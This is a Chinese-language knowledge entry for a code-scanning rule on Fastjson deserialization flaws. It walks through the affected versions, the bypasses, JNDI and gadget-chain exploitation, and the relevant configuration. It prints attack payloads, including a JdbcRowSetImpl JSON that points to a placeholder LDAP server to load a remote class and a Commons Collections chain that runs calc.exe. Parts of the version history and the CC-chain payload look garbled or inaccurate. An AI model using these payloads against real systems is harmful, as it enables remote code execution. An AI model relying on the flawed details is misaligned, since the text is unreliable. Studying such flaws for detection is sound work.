# Java Fastjson反序列化漏洞

> 规则 ID：`other_fastjson_deserialization` · 类别：deser · 关键 sink：parseObject
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java Fastjson反序列化漏洞
Fastjson是阿里巴巴开源的高性能JSON解析库，广泛应用于Java项目的JSON序列化/反序列化场景。其反序列化漏洞核心成因是**未严格限制反序列化的类范围**，且支持通过特定格式触发危险类的实例化与方法执行，攻击者可构造恶意JSON payload，在目标服务器上执行任意代码，造成服务器接管、数据泄露等严重后果。以下从漏洞本质、触发条件、核心原理、不同版本漏洞变种及典型场景展开分析。

## 一、漏洞本质
Fastjson的反序列化机制为了支持“动态类型解析”，允许在JSON字符串中通过`@type`字段指定待反序列化的目标类。当解析器处理该字段时，会加载并实例化指定的类，若该类包含**可被自动调用的危险方法**（如构造方法、setter方法、静态代码块、反序列化回调方法等），且方法逻辑可被攻击者控制，就会导致任意代码执行（RCE）、文件读写、命令执行等恶意行为。

核心矛盾：Fastjson为了灵活性开放了“基于@type的动态类加载”，但未默认限制危险类的加载/实例化，且对类的方法调用缺乏安全校验。

## 二、核心触发条件
1. **基础条件**：目标系统使用存在漏洞的Fastjson版本，且开启了“支持@type字段解析”（Fastjson默认开启该功能）；
2. **环境条件**：目标JVM环境中存在可被利用的“gadget类”（即包含危险方法的类，可来自JDK内置类、第三方依赖包）；
3. **输入条件**：攻击者可控制Fastjson的反序列化输入（如接口接收JSON参数，直接传入`JSON.parse()`/`JSON.parseObject()`方法）。

## 三、反序列化核心流程与漏洞触发逻辑
Fastjson反序列化核心步骤：
1. 解析JSON字符串，识别`@type`字段指定的类名；
2. 通过类加载器加载该类，实例化对象（调用构造方法）；
3. 遍历JSON中的其他字段，通过反射调用对应setter方法为属性赋值；
4. 部分版本会触发类的`readObject()`、`invoke()`等回调方法。

漏洞触发关键：攻击者通过`@type`指定危险类，并通过JSON字段控制该类的属性，触发危险方法执行。例如：
- 若类的setter方法中包含命令执行逻辑，通过JSON字段传入命令参数即可触发；
- 若类的构造方法依赖外部资源（如JNDI），可构造JNDI链接指向恶意服务器，触发远程类加载。

## 四、不同版本的Fastjson反序列化漏洞变种
Fastjson的反序列化漏洞并非单一漏洞，而是随着版本迭代暴露的一系列变种，核心差异在于利用方式、修复绕过手段及影响版本范围：

### 1. 早期基础漏洞（Fastjson < 1.2.24）
#### 核心漏洞点
未限制`@type`字段加载危险类，可直接利用JDK内置类或常见第三方类触发RCE。
#### 典型利用方式
通过`@type`指定`com.sun.rowset.JdbcRowSetImpl`（JDK内置类），利用其`setDataSourceName()`方法设置JNDI链接，触发JNDI注入：
```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://恶意服务器:1389/恶意类",
  "autoCommit":true
}
```
#### 触发逻辑
`JdbcRowSetImpl`的`setAutoCommit(true)`会调用`connect()`方法，进而通过JNDI加载远程恶意类，执行代码。
#### 影响范围
Fastjson 1.2.24及之前版本，无任何类黑白名单限制。

### 2. 黑白名单绕过漏洞（Fastjson 1.2.25 - 1.2.41）
#### 背景
官方在1.2.25版本中新增“类黑白名单”机制，默认禁止加载`JdbcRowSetImpl`等危险类，但存在绕过逻辑。
#### 绕过方式
- **类名变形**：利用Fastjson对类名解析的宽松性，如添加空格、下划线、大小写混淆（部分版本可绕过）；
- **内部类/别名绕过**：指定Fastjson内置的类别名，或利用第三方依赖的内部类；
- **多态绕过**：通过父类/接口指定`@type`，实际加载子类（如`java.sql.RowSet`指向`JdbcRowSetImpl`）。
#### 典型利用示例
```json
{
  "@type":"Lcom.sun.rowset.JdbcRowSetImpl;", // 增加L和;（JNI类名格式）绕过黑白名单
  "dataSourceName":"ldap://恶意服务器:1389/exp",
  "autoCommit":true
}
```
#### 影响范围
1.2.25~1.2.41版本，黑白名单机制存在缺陷，可被多种方式绕过。

### 3. 自动类型匹配漏洞（Fastjson 1.2.42 - 1.2.47）
#### 背景
官方在1.2.42版本强化了黑白名单，封堵了类名变形绕过，但引入了“自动类型匹配”机制——当JSON字段与目标类的属性匹配时，即使不指定`@type`，也会自动尝试实例化对应类。
#### 漏洞原理
攻击者可构造JSON字段与危险类的属性完全匹配，触发Fastjson自动加载该类并执行危险方法，无需显式指定`@type`。
#### 典型利用场景
针对`org.apache.commons.collections.Transformer`（CC链），构造与该类属性匹配的JSON，触发CC链执行命令：
```json
{
  "i":{
    "@type":"org.apache.commons.collections.map.TransformedMap",
    "map":{
      "key":"value"
    },
    "factory":{
      "@type":"org.apache.commons.collections.functors.ChainedTransformer",
      "transformers":[
        {
          "@type":"org.apache.commons.collections.functors.ConstantTransformer",
          "i":"java.lang.Runtime"
        },
        {
          "@type":"org.apache.commons.collections.functors.InvokerTransformer",
          "i":"getRuntime",
          "i1":[],
          "i2":""
        },
        {
          "@type":"org.apache.commons.collections.functors.InvokerTransformer",
          "i":"exec",
          "i1":["calc.exe"],
          "i2":""
        }
      ]
    }
  }
}
```
#### 影响范围
1.2.42~1.2.47版本，自动类型匹配机制导致无`@type`也可触发漏洞。

### 4. 缓存机制绕过漏洞（Fastjson 1.2.48 - 1.2.60）
#### 背景
官方在1.2.48版本修复了自动类型匹配，但引入了“类加载缓存”机制——已加载的类会被缓存，攻击者可通过多次请求绕过校验，或利用`TypeUtils`类的漏洞触发危险类加载。
#### 漏洞原理
- **缓存污染**：首次请求加载一个“无害类”并缓存，二次请求利用缓存的类加载器加载危险子类；
- **TypeUtils绕过**：利用`TypeUtils.loadClass()`方法的参数可控，加载危险类。
#### 影响范围
1.2.48~1.2.60版本，缓存机制和TypeUtils类的校验不严格，仍存在绕过可能。

### 5. 最新变种（Fastjson 2.x 部分版本）
#### 背景
Fastjson 2.x重构了核心逻辑，默认关闭`@type`解析，但部分场景下（如开启`CompatibleMode`兼容模式）仍存在漏洞。
#### 漏洞点
- 兼容模式下，`@type`解析逻辑与1.x类似，存在类加载限制绕过；
- 2.x新增的`JSONB`格式解析存在缺陷，可触发危险类实例化；
- 第三方框架集成Fastjson 2.x时，未正确关闭动态类型解析，导致漏洞复现。

## 五、不同利用场景的细分
除了核心的RCE漏洞，Fastjson反序列化漏洞还可根据目标环境的不同，触发不同的恶意行为：

### 1. JNDI注入场景（最主流）
#### 适用环境
目标JDK版本 ≤ 8u191（高版本JDK默认限制JNDI远程类加载），且存在`com.sun.rowset.JdbcRowSetImpl`、`org.apache.naming.ResourceLinkRef`等JNDI相关类。
#### 攻击流程
1. 攻击者搭建LDAP/RMI恶意服务器，托管包含恶意代码的类文件；
2. 构造包含JNDI链接的JSON payload，发送至目标接口；
3. Fastjson反序列化时触发JNDI lookup，加载远程恶意类并执行代码。

### 2. 基于第三方依赖的Gadget利用场景
#### 适用环境
目标系统引入了Apache Commons Collections、Apache Commons Beanutils、Spring Core等包含可利用Gadget的依赖。
#### 攻击逻辑
利用这些依赖中的类构造“调用链”，通过Fastjson反序列化触发链上方法执行，最终调用`Runtime.exec()`执行命令。例如：
- CC链（Apache Commons Collections < 3.2.2）；
- CB链（Apache Commons Beanutils）；
- Spring链（Spring Core < 5.3.18）。

### 3. 文件读写/信息泄露场景
#### 适用环境
无法触发RCE（如JDK版本过高、无Gadget依赖），但可利用反序列化读取/写入文件。
#### 利用方式
通过`java.io.FileInputStream`、`java.io.FileOutputStream`等类，构造JSON payload读取服务器敏感文件（如`/etc/passwd`、`application.yml`），或写入恶意文件（如webshell）。

### 4. 无@type字段的盲反序列化场景
#### 适用环境
目标系统禁用了`@type`字段解析，但Fastjson仍会尝试自动匹配类类型。
#### 攻击逻辑
构造与危险类属性完全匹配的JSON，触发Fastjson自动实例化该类，无需显式指定`@type`，属于“盲反序列化”攻击。

## 六、漏洞影响的关键因素
1. **Fastjson版本**：版本越低，漏洞越严重，绕过方式越多；1.2.68+及2.x默认加固版本风险显著降低；
2. **JDK版本**：JDK 8u191+默认限制JNDI远程类加载，可阻断大部分JNDI注入型利用；
3. **第三方依赖**：目标系统是否包含可利用的Gadget依赖，决定了能否构造RCE调用链；
4. **配置项**：是否手动关闭`@type`解析（如设置`ParserConfig.getGlobalInstance().setAutoTypeSupport(false)`），是否自定义黑白名单；
5. **输入过滤**：目标接口是否对JSON输入做了严格过滤（如拦截`@type`、危险类名）。

综上，Fastjson反序列化漏洞的核心是“动态类加载+危险方法自动执行”的组合缺陷，其变种和利用场景高度依赖版本、运行环境和依赖库，是Java生态中影响范围最广、利用方式最灵活的反序列化漏洞之一。

